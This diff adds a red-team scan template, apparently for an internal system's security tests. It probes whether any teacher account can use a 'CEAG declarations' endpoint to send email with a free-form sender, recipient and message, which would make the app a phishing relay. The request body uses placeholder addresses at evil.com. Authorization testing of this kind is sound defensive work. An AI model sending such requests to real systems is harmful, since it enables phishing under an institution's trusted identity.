@@ -1,0 +1,20 @@
+id: rt08-ceag-phishing-relay-teacher
+info:
+  name: "TEACHER arbitrario envia 'declaracoes CEAG' com remetente/destino/mensagem livres (phishing assinado pela app)"
+  author: redteam-sisdef
+  severity: medium
+  description: "POST /documentos/send-ceag-declarations/:bancaId: checkRole TEACHER/ADMIN sem ownership; campos ceapgEmail/senderName/senderEmail/message livres - email de phishing com identidade Institucional. SMTP fake em test pode retornar 500; word matcher so casara com sucesso real."
+  tags: redteam,abuse,relay,phishing
+http:
+  - raw:
+      - |
+        POST /documentos/send-ceag-declarations/3 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_TEACHER}}
+        Content-Type: application/json
+
+        {"ceapgEmail":"victim@evil.com","senderName":"Red Team Probe","senderEmail":"phish@evil.com","message":"probe"}
+    matchers:
+      - type: word
+        words:
+          - "Declarações enviadas"
